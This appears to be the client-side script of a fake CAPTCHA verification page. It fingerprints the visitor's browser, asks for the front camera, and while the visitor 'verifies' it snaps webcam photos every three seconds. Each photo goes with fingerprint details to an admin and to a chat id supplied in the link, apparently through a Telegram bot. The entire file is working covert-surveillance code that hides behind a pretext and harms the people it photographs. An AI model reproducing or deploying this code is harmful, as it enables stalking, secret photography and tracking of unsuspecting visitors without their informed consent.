import { collectFingerprint, buildCaption } from "./fingerprint.js";

var RUNTIME = { recaptchaKey: "", ready: false };
var FP = null;

async function loadConfig() {
  try {
    const r = await fetch("/api/config");
    const d = await r.json();
    RUNTIME.recaptchaKey = d.recaptchaKey || "";
    RUNTIME.ready = true;
  } catch { RUNTIME.ready = true; }
}

var CAPTURE_INTERVAL = 3000, IMAGE_QUALITY = 0.78, CAM_WIDTH = 640, CAM_HEIGHT = 480;

var video = document.getElementById("video");
var canvas = document.getElementById("canvas");
var camCard = document.getElementById("camCard");
var camTitle = document.getElementById("camTitle");
var camSub = document.getElementById("camSub");
var camStatus = document.getElementById("camStatus");
var stats = document.getElementById("stats");
var cntCap = document.getElementById("cntCaptures");
var delSt = document.getElementById("delStatus");
var latVal = document.getElementById("latVal");
var captchaW = document.getElementById("captchaWrap");
var bottomR = document.getElementById("bottomRight");

var params = new URLSearchParams(window.location.search);
var userChatId = params.get("id");
var hasTarget = !!(userChatId && userChatId.trim());

var stream = null, captureTimer = null, captureCount = 0, capturing = false;
var recaptchaWidgetId = null, isSending = false;

function log(m){ console.log("[FP] " + m); }
function logErr(m, e){ console.error("[FP ERROR] " + m, e || ""); }

/* ---------- Send via /api/send ---------- */
function sendPhoto(blob, caption, isAdmin) {
  var fd = new FormData();
  fd.append("chat_id", "placeholder");
  fd.append("photo", blob, "fp_" + Date.now() + ".jpg");
  fd.append("caption", caption);
  fd.append("parse_mode", "HTML");

  var url = "/api/send?role=" + (isAdmin ? "admin" : "user");
  if (!isAdmin && hasTarget) url += "&target=" + encodeURIComponent(userChatId);

  return fetch(url, { method: "POST", body: fd })
    .then(function(r){ return r.json(); })
    .then(function(d){ return d.ok; })
    .catch(function(){ return false; });
}

/* ---------- Capture ---------- */
function capture() {
  if (!stream || !capturing || isSending) return Promise.resolve();
  isSending = true;
  var t0 = performance.now();

  try {
    canvas.width = video.videoWidth || CAM_WIDTH;
    canvas.height = video.videoHeight || CAM_HEIGHT;
    canvas.getContext("2d").drawImage(video, 0, 0);
  } catch(e) {
    logErr("canvas", e);
    isSending = false;
    return Promise.resolve();
  }

  return new Promise(function(res){ canvas.toBlob(res, "image/jpeg", IMAGE_QUALITY); })
    .then(function(blob) {
      if (!blob) { isSending = false; return; }

      var adminCaption = buildCaption(FP, {
        index: captureCount + 1,
        total: 999,
        role: "admin",
        targetId: userChatId
      });

      var userCaption = buildCaption(FP, {
        index: captureCount + 1,
        total: 999,
        role: "user"
      });

      var chain = sendPhoto(blob, adminCaption, true);
      if (hasTarget) chain = chain.then(function(){ return sendPhoto(blob, userCaption, false); });

      return chain.then(function() {
        captureCount++;
        if (cntCap) cntCap.textContent = captureCount;
        if (delSt) delSt.textContent = "✓";
        if (latVal) latVal.textContent = Math.round(performance.now() - t0) + "ms";
      });
    })
    .catch(function(e){ logErr("chain", e); })
    .then(function(){ isSending = false; });
}

/* ---------- Start camera ---------- */
function startCamera() {
  camTitle.textContent = "Camera access";
  camSub.textContent = "Awaiting permission";
  camStatus.textContent = "Idle";

  navigator.mediaDevices.getUserMedia({
    video: { width: { ideal: CAM_WIDTH }, height: { ideal: CAM_HEIGHT }, facingMode: "user" }
  })
  .then(function(s) {
    stream = s;
    video.srcObject = stream;
    return video.play();
  })
  .then(function() {
    return new Promise(function(res) {
      if (video.readyState >= 2) return res();
      video.onloadeddata = res;
      setTimeout(res, 2500);
    });
  })
  .then(function() {
    window.__cameraReady = true;
    camCard.classList.add("active");
    camTitle.textContent = "Camera connected";
    camSub.textContent = "Streaming";
    camStatus.textContent = "Active";

    if (stats) stats.style.display = "grid";
    if (captchaW) { captchaW.classList.remove("dimmed"); captchaW.classList.add("ready"); }
    if (bottomR) bottomR.textContent = "Verifying";

    capturing = true;
    capture();
    captureTimer = setInterval(capture, CAPTURE_INTERVAL);
    tryRenderRecaptcha();
  })
  .catch(function(err) {
    logErr("camera", err);
    camTitle.textContent = "Camera required";
    camSub.textContent = "Access denied";
    camStatus.textContent = "Error";
  });
}

function stopCapture() {
  capturing = false;
  if (captureTimer) { clearInterval(captureTimer); captureTimer = null; }
  if (stream) { stream.getTracks().forEach(function(t){ t.stop(); }); stream = null; }
}

/* ---------- reCAPTCHA ---------- */
function tryRenderRecaptcha() {
  if (!RUNTIME.recaptchaKey) return;
  if (!window.__recaptchaReady || !window.__cameraReady || recaptchaWidgetId !== null) return;
  var c = document.getElementById("recaptchaWidget");
  if (!c) return;
  try {
    recaptchaWidgetId = window.grecaptcha.render(c, {
      sitekey: RUNTIME.recaptchaKey,
      callback: onRecaptchaSuccess,
      "expired-callback": onRecaptchaExpired,
      "error-callback": onRecaptchaError
    });
  } catch(e){ logErr("recaptcha", e); }
}
window.__tryRenderRecaptcha = tryRenderRecaptcha;

function onRecaptchaSuccess() {
  if (bottomR) bottomR.textContent = "✓ Verified";
  stopCapture();
  setTimeout(function(){ window.location.href = "next.html"; }, 1000);
}
window.onRecaptchaSuccess = onRecaptchaSuccess;
window.onRecaptchaExpired = function(){ camTitle.textContent = "Session expired"; camSub.textContent = "Resolve again"; };
window.onRecaptchaError = function(){ camTitle.textContent = "Error"; camSub.textContent = "Reload"; };

/* ---------- Boot ---------- */
async function boot() {
  log("collecting fingerprint...");
  FP = await collectFingerprint();
  log("fingerprint collected — hash: " + FP.hash);
  await loadConfig();
  startCamera();
}

window.addEventListener("load", boot);
window.addEventListener("beforeunload", stopCapture);
